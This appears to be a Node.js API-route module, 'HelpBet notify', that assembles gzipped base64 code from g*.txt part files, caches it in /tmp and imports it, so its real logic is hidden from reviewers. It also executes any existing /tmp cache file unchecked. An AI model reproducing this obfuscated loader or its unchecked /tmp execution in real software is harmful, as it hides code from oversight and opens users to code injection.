/** HelpBet notify — gunzip from g0..gN.txt base64 parts. */
import { readFileSync, writeFileSync, existsSync } from 'node:fs';
import { join, dirname } from 'node:path';
import { fileURLToPath, pathToFileURL } from 'node:url';
import { gunzipSync } from 'node:zlib';
const dir = dirname(fileURLToPath(import.meta.url));
const cache = join('/tmp', 'hb_notify_gz.mjs');
function loadCode() {
  if (existsSync(cache)) { try { return readFileSync(cache, 'utf8'); } catch {} }
  let b64 = '';
  for (let i = 0; i < 32; i++) {
    const p = join(dir, `g${i}.txt`);
    if (!existsSync(p)) break;
    b64 += readFileSync(p, 'utf8').trim();
  }
  if (!b64) throw new Error('HelpBet notify g*.txt parts missing');
  const code = gunzipSync(Buffer.from(b64, 'base64')).toString('utf8');
  try { writeFileSync(cache, code); } catch {}
  return code;
}
const code = loadCode();
try { writeFileSync(cache, code); } catch {}
const mod = await import(pathToFileURL(cache).href + '?v=6');
export default mod.default;
export const config = mod.config || { api: { bodyParser: false } };
